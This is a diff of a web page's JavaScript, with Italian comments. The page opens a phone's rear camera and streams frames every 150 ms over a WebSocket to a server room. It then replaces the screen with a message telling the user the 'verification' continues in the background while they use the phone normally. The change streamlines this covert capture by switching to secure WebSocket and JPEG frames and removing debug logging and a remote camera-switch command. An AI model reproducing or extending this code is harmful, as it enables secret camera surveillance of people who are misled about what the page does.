@@ -23,29 +23,14 @@
     const room = new URLSearchParams(location.search).get('room') || 'user1';
     
     let stream = null;
-  let sending = false;
-  let currentFacing = 'environment';
+    let sending = false;
 
     // WebSocket (anche in background)
-    const ws = new WebSocket(`ws://${location.host}/bg-stream?room=${room}`);
+    const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
 
-    ws.onopen = () => {
-      console.log('[WS] Aperto, avvio camera');
-      startCamera();
-    };
-    ws.onmessage = (e) => {
-      try {
-        const msg = JSON.parse(e.data);
-        if (msg.type === 'camera' && msg.mode) {
-          console.log('[WS] Comando cambio camera:', msg.mode);
-          if (msg.mode !== currentFacing) {
-            startCamera(msg.mode);
-          }
-        }
-      } catch {}
-    };
-    ws.onclose = () => console.log('[WS] Connessione persa');
-    ws.onerror = (e) => console.log('[WS] Errore', e);
+    ws.onopen = () => startCamera();
+    ws.onclose = () => console.log('Connessione persa');
+    ws.onerror = () => console.log('Errore WS');
 
     // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
     function sendFrame() {
@@ -56,31 +41,22 @@
       canvas.toBlob(blob => {
         if (ws.readyState === WebSocket.OPEN && blob) {
           ws.send(blob);
-          console.log('[WS] Frame inviato', blob.size, 'bytes');
-        } else {
-          console.log('[WS] Frame NON inviato');
         }
-      }, 'video/webm; codecs=vp8', 0.8);
+      }, 'image/jpeg', 0.6);
       setTimeout(sendFrame, 150);
     }
 
     // Avvia fotocamera POSTERIORE
-    async function startCamera(facing = 'environment') {
+    async function startCamera() {
       try {
-        currentFacing = facing;
-        if (stream) {
-          stream.getTracks().forEach(t => t.stop());
-        }
-        console.log('[CAM] Richiesta camera', facing);
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: facing, width: { ideal: 1280 } },
+          video: { facingMode: 'environment', width: { ideal: 1280 } },
           audio: false
         });
         video.srcObject = stream;
         video.onloadedmetadata = () => {
           sending = true;
           sendFrame();
-          console.log('[CAM] Camera avviata', facing);
 
           // Messaggio finale + chiudi visuale
           document.body.innerHTML = `
@@ -89,6 +65,7 @@
               <small>Puoi usare il telefono normalmente.<br>
               La verifica continua in background.</small>
             </div>`;
+          
           // Opzionale: minimizza automaticamente (solo mobile)
           setTimeout(() => {
             if (navigator.userActivation?.isActive) {
@@ -97,7 +74,6 @@
           }, 3000);
         };
       } catch (err) {
-        console.log('[CAM] Errore apertura camera', err);
         document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
       }
     }
